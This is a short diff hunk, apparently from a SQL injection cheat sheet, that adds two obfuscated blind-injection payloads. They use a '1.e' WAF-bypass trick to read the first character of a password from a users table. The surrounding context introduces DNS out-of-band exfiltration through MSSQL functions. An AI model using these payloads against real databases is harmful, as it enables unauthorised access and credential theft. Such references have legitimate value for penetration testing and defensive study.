@@ -390,6 +390,8 @@ A period instead of a whitespace between FROM and a column name:
 - TYPE_NAME()
 - COL_NAME()
  
+ 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
+ 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 #(first char = 70) or'1'='2
  
 *****DNS Out-of-Band 
 If confronted with a fully blind SQL injection with disabled stacked queries, it’s possible to attain DNS out-of-band (OOB) data exfiltration via the functions fn_xe_file_target_read_file, fn_get_audit_file, and  fn_trace_gettable, example:
